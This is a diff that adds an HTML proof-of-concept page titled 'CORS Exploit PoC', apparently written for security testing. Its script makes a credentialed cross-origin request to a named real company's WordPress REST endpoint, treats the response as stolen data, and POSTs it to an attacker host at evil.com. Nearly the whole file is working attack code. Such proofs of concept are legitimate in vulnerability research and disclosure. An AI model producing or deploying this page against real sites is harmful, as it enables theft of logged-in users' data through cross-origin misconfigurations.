@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>CORS Exploit PoC</h1>
+    <script>
+        fetch("https://www.criteo.com/wp-json/", {
+            method: "GET",
+            credentials: "include", // Include victim's cookies
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Stolen Data:", data); // Display the stolen data
+            // Exfiltrate data to attacker's server
+            fetch("https://www.evil.com/steal-data", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ stolenData: data }),
+            });
+        })
+        .catch(err => console.error("Exploit failed:", err));
+    </script>
+</body>
+</html>
+
